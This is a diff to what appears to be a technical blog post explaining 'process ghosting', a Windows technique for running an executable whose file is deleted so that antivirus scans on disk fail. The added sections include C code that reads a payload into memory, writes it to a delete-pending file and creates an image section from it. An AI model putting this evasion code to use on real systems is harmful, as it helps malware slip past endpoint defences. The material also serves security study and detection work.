@@ -112,7 +112,6 @@ typedef struct _PS_CREATE_NOTIFY_INFO {
 
 Of interest here is the `struct _FILE_OBJECT *FileObject` field which is a pointer to the file object for the process executable file. Callback functions can use this to scan the executable on disk for malware. But what if the executable has been deleted.....?
 
-
 ## Boo! A Ghost! 👻
 
 Some of the ways to delete a file include:
@@ -198,9 +197,45 @@ If the function is successful, the handle to the open file iis returned.
 
 ### Reading Bytes
 
-Nex
+Now, we need to read the bytes from the original payload. These bytes can also be fetched from a remote source like a URL or a TCP Stream (future project idea?). Basically, we read the bytes from the file  as `unsigned char` and store them on the heap and return a pointer to it. The main code which does this is as follows:
+
+```c
+unsigned char * read_orig_exe(char * original_exe) {
+	DWORD ho_fsz, lo_fsz;
+
+	// Open file for reading
+	HANDLE hfile = CreateFileA(original_exe, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	// Get File Size
+	lo_fsz = GetFileSize(hfile, &ho_fsz);
+
+	// Allocate memory
+	unsigned char* s_bytes = (unsigned char*)malloc(lo_fsz);
+
+	// Read File
+	BOOL result = ReadFile(hfile, s_bytes, lo_fsz, &ho_fsz, NULL);
+	CloseHandle(hfile);
+	return s_bytes;
+}
+```
 
 ### Fetch Sections
+
+Now that we have our target file ready in _Delete-Pending_ stage and the contents we wish to write to it, we first write the payload to it. Then we use the [NtCreateSection](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection) to create a session object for the target file. If there are no errors encountered during this, the handle to the _Section Object_ is returned:
+
+```c
+HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
+	DWORD _ho_fsz;
+	HANDLE hsection = NULL;
+
+	// Write to open handle of the file to be deleted
+	BOOL _res = WriteFile(hfile, (LPCVOID)f_bytes, f_size, &_ho_fsz, NULL);
+
+	// Create section object
+	NTSTATUS _status = NtCreateSection(&hsection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hfile);
+	
+	return hsection;
+}
+```
 
 ## References
 - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
